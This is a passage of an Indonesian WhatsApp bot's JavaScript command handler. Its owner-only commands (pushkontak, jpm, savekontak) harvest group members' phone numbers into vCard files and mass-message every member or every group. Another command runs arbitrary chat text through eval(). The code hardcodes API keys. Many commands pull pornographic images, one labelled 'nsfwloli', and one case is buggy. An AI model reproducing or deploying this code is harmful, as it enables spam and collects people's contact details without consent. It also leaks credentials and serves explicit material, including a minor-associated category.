    }, { quoted: m });
  } catch (e) {
    console.error(e);
    replyryuu('Maaf, terjadi kesalahan saat mengambil gambar.');
  }
}
break;
case '>':
if (!isRyuuTheCreator) return reply(mess.only.owner)
var err = new TypeError
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replyReinzID(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replyReinzID(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replyReinzID(util.format(_syntax + _err))
}
break
case 'pushkontak': {
    if (!isRyuuTheCreator) return reply(mess.only.owner)
      if (!m.isGroup) return replyReinzID(`The feature works only in grup`)
    if (!text) return replyReinzID(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replyReinzID(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    RyuuBotz.sendMessage(pler, { text: q})
     }  
     replyReinzID(`sukses kak`)
      }
      break
case 'pushkontakv2':{
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (!q) return replyReinzID(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
reply(mess.wait)
const metadata2 = await RyuuBotz.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
RyuuBotz.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replyReinzID(`Success`)
}
break
case 'pushkontakv3': {
if (!isRyuuTheCreator) return reply(`Khusus Owner Aja`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("Otw Boskuuu")
const groupMetadataa = !m.isGroup? await RyuuBotz.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
memk = await uploadwidipe(media)
await RyuuBotz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await RyuuBotz.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
reply("Succes Boss!")
}
break
case 'pushkontakv4': {
if (!isRyuuTheCreator) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
await reply("Otw Boskuuu")
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
mem = await uploadwidipe(media)
await RyuuBotz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await RyuuBotz.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Succes Boss!")
}
break
case "pushkontakv5": {
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (!text) return reply("*Contoh Command :*\n.pushkontakv5 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.includes("|")) return reply("*Contoh Command :*\n.pushkontakv5 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return reply("Format Delay Tidak Valid")
if (!teks) return reply("*Contoh Command :*\n.pushkontakv5 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await RyuuBotz.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./node_modules/Arisu-MD/data/contacts.json', JSON.stringify(contacts))
await RyuuBotz.sendMessage(mem, {text: teks}, {quoted: qpushkontak})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN: KONTAK JB [${createSerial(2)}]`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./node_modules/Arisu-MD/data/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await RyuuBotz.sendMessage(m.sender, { document: fs.readFileSync("./node_modules/Arisu-MD/data/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: qpushkontak })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./node_modules/Arisu-MD/data/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./node_modules/Arisu-MD/data/contacts.vcf", "")
}}
break;
// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //
case 'jadwalsholat': {
    if (!text) return reply(`• *Contoh :* ${prefix + command} jakarta pusat`);

    async function jadwalSholat(kota) {
        try {
            const { data } = await axios.get(`https://www.dream.co.id/jadwal-sholat/${kota}/`);
            const $ = cheerio.load(data);
            const rows = $(".table-index-jadwal tbody tr");
            const jadwal = [];

            rows.each((index, row) => {
                const cols = $(row).find("td");
                jadwal.push({
                    subuh: $(cols[1]).text().trim(),
                    duha: $(cols[2]).text().trim(),
                    zuhur: $(cols[3]).text().trim(),
                    asar: $(cols[4]).text().trim(),
                    magrib: $(cols[5]).text().trim(),
                    isya: $(cols[6]).text().trim(),
                });
            });

            return jadwal[0];
        } catch (error) {
            throw new Error("Gagal mengambil data jadwal sholat");
        }
    }

    try {
        const jadwal = await jadwalSholat(text);
        const caption = `
┌「 ${text.toUpperCase()} 」
├ Subuh: ${jadwal.subuh}
├ Dhuha: ${jadwal.duha}
├ Dzuhur: ${jadwal.zuhur}
├ Ashar: ${jadwal.asar}
├ Maghrib: ${jadwal.magrib}
├ Isya: ${jadwal.isya}
└──────────`.trim();

        const thumbnailUrl = "https://files.catbox.moe/r3mbjq.jpg";

        await RyuuBotz.sendMessage(m.chat, {
            text: caption,
            contextInfo: {
                serverMessageId: null,
                newsletterName: "ReinzID Chx",
                externalAdReply: {
                    title: `Jadwal Sholat Harian`,
                    mediaType: 1,
                    previewType: 1,
                    body: `Informasi waktu sholat untuk kota ${text}`,
                    thumbnailUrl,
                    renderLargerThumbnail: true,
                    mediaUrl: "https://www.islamicfinder.org",
                    sourceUrl: "https://www.islamicfinder.org"
                }
            }
        }, { quoted: m });

    } catch (error) {
        reply("Gagal mendapatkan jadwal sholat. Pastikan nama kota benar.");
    }
}
break;
case 'savekontak': case 'svkontak':{
if (!isRyuuTheCreator) return reply(`Khusus Owner Ajah`)
if (!m.isGroup) return reply(`Fitur Ini Khusus Group`)
let cmiggc = await RyuuBotz.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './node_modules/Arisu-MD/contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
RyuuBotz.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
}
break
case "cekidch": case "idch": {
if (!text) return reply("linkchnya")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await RyuuBotz.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return reply(teks)
}
break
case 'cekidgc': {
if (!isPrem) return replyprem(mess.premium)
let getGroups = await RyuuBotz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await RyuuBotz.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv3 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case 'savekontakv2': {
if (!isRyuuTheCreator) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !m.isGroup? await RyuuBotz.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./node_modules/Arisu-MD/database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./node_modules/Arisu-MD/all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await RyuuBotz.sendMessage(from, { document: fs.readFileSync("./node_modules/Arisu-MD/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./node_modules/Arisu-MD/database/contacts.json", JSON.stringify(contacts))
}
}
break
// 🫣🫣
case 'infogc':
case 'infogroup': {
  try {
    const regex = /chat\.whatsapp\.com\/([0-9A-Za-z]+)/i
    const code = argsbiyuoffc[0]?.match(regex)?.[1]
    if (code) {
      const info = await RyuuBotz.groupGetInviteInfo(code)
      const groupPP = info.groupPicture || 'https://telegra.ph/file/265c672094dfa87caea19.jpg'
      const adminCount = info.participants?.filter(p => p.admin !== null).length || 'Tidak diketahui'
      const creationDate = info.creation ? new Date(info.creation * 1000).toLocaleString('id-ID') : 'Tidak diketahui'
      let creator = 'Tidak diketahui'
      if (info.owner) {
        creator = info.owner.split('@')[0]
      } else {
        const creatorData = info.participants?.find(p => p.admin === 'creator')
        if (creatorData) creator = creatorData.id.split('@')[0]
      }
      const caption = `*INFO GRUP (via Link):*\n\n` +
                      `*Nama:* ${info.subject}\n` +
                      `*Deskripsi:* ${info.desc || 'Tidak ada deskripsi.'}\n` +
                      `*Tanggal Dibuat:* ${creationDate}\n` +
                      `*Dibuat Oleh:* ${creator}\n` +
                      `*Total Member:* ${info.size || 'Tidak diketahui'}\n` +
                      `*Jumlah Admin:* ${adminCount}`
      await RyuuBotz.sendMessage(m.chat, { image: { url: groupPP }, caption }, { quoted: m })
    } else {
      if (!m.isGroup) return reply('Command ini hanya bisa digunakan di grup atau dengan link grup.')

      const metadata = await RyuuBotz.groupMetadata(m.chat)
      const groupPP = await RyuuBotz.profilePictureUrl(m.chat, 'image').catch(() =>
        'https://telegra.ph/file/265c672094dfa87caea19.jpg'
      )
      const adminCount = metadata.participants.filter(p => p.admin !== null).length
      const creationDate = metadata.creation ? new Date(metadata.creation * 1000).toLocaleString('id-ID') : 'Tidak diketahui'
      let creator = 'Tidak diketahui'
      if (metadata.owner) {
        creator = metadata.owner.split('@')[0]
      } else {
        const creatorData = metadata.participants.find(p => p.admin === 'creator')
        if (creatorData) creator = creatorData.id.split('@')[0]
      }
      const caption = `*INFO GRUP:*\n\n` +
                      `*Nama:* ${metadata.subject}\n` +
                      `*Deskripsi:* ${metadata.desc || 'Tidak ada deskripsi.'}\n` +
                      `*Tanggal Dibuat:* ${creationDate}\n` +
                      `*Dibuat Oleh:* ${creator}\n` +
                      `*Total Member:* ${metadata.participants.length}\n` +
                      `*Jumlah Admin:* ${adminCount}`
      await RyuuBotz.sendMessage(m.chat, { image: { url: groupPP }, caption }, { quoted: m })
    }
  } catch (e) {
    console.error(e)
    reply('Gagal mengambil info grup. Link valid? atau bot tidak punya akses.')
  }
}
break
case 'jpm':{
if (!isRyuuTheCreator) return reply(`Khusus Owner Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await RyuuBotz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await RyuuBotz.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
mem = await uploadwidipe(media)
await RyuuBotz.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await RyuuBotz.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN ONWER✅*")
}
break

case 'jpm2':{
if (!isRyuuTheCreator) return reply(`Khusus Owner Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await RyuuBotz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await RyuuBotz.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
mem = await uploadwidipe(media)
await RyuuBotz.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await RyuuBotz.sendMessage(xnxx, { text: text.split('|')[0]})
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN ONWER✅*")
}
break

case 'sendkontak': case 'kontak':
if (!isRyuuTheCreator) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return reply(`Khusus Group`)
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let snContact = {
	displayName: "Contact", contacts: [{displayName: ownername, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+ownername+";;;\nFN:"+ownername+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
RyuuBotz.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break

case 'getcontact': case 'getkontak':
if (!isRyuuTheCreator) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return reply(`Fitur Ini Khusus Group`)
huhuhs = await RyuuBotz.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
RyuuBotz.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break

            case 'id':{
            replyReinzID(from)
           }
          break
          case 'userjid':{
          	if(!isRyuuTheCreator) return reply(mess.only.owner)
        const groupMetadata = m.isGroup ? await RyuuBotz.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replyReinzID(textt)
    }
    break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replyReinzID(`Contoh : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replyReinzID(`Contoh : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await RyuuBotz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
	case 'hentaivid2': {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { video: { url: `https://api.fgmods.xyz/api/nsfw-nime/hentai-mp4?apikey=qzu9Ja5Q`}, 
caption: `success` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { video: { url: `https://api.fgmods.xyz/api/nsfw-nime/hentai-mp4?apikey=qzu9Ja5Q`}, 
caption: `success` }, { quoted: m })
            }
            break
case 'trap' :
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!isPrem) return replyprem(mess.premium)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break 
case 'ass':
case 'ahegao':
case 'bdsm':
case 'blowjob':
case 'cuckold':
case 'cum':
case 'eba':
case 'ero':
case 'femdom':
case 'food':
case 'gangbang':
case 'glasses':
case 'jahy':
case 'masturbation':
case 'neko-hentai':
case 'neko-hentai2':
case 'nsfwloli':
case 'orgy':
case 'panties':
case 'pussy':
case 'tentacles':
case 'thighs':
case 'hentai': {
 RyuuBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
 if (!isPrem) return replyprem(mess.premium)
try {
async function scrapeData() {
    try {
const page = Math.floor(Math.random() * 50);
        const { data } = await axios.get('https://e-hentai.org/tag/random?prev=' + page);
        const $ = cheerio.load(data);
        const results = [];
        $('.glthumb').each((index, element) => {
            const img = $(element).find('img');
            const imgSrc = img.attr('data-src');
            
            if (imgSrc) {
                results.push(imgSrc);
            }
        });
        return results
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}
function getRandomElement(array) {
    const randomIndex = Math.floor(Math.random() * array.length);
    return array[randomIndex];
}
const jmebut = await scrapeData()
const randomUrl = getRandomElement(jmebut);
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: randomUrl } }, { quoted: m })
  } catch (error) {
    return reply(`💥 Terjadi kesalahan saat mengambil data: ${error.message}`);
  }
}
break
case 'mangasearch': {
if (!isPrem) return replyprem(mess.premium)
if (!text) return reply('mau cari manga apa??')
try {
const data = await KlikMangaSearch(text);
    let resultMessage = data.map(manga => 
      `🎬 *Judul:* ${manga.manga_name}\n` +
      `⭐ *Rating:* ${manga.manga_genre}\n` +
      `📖 *Deskripsi:* ${manga.manga_desc}\n` +
      `🔗 *URL:* ${manga.manga_url}\n`
    ).join('\n');
    RyuuBotz.sendMessage(
      from, 
      { 
        caption: `🌟 *Hasil Pencarian Film*\n\n${resultMessage}`, 
        image: { url: data.manga_thumb[0]}, 
      }, 
      { quoted: m }
    );
  } catch (error) {
    return reply(`💥 Terjadi kesalahan saat mengambil data: ${error.message}`);
  }
}
break
case 'yuri':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if (!isPrem) return replyprem(mess.premium)
RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
var ahegaonsfw = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replyReinzID(mess.nsfw)
reply(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await RyuuBotz.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replyReinzID(mess.nsfw)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await RyuuBotz.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replyReinzID(mess.nsfw)
reply(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
RyuuBotz.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'animeawoo':{
 if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animemegumin':{
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeshinobu':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehandhold':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehighfive':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecringe':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animedance':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehappy':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeglomp':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmug':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeblush':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewave':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmile':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepoke':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewink':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebonk':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebully':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeyeet':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await RyuuBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebite':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
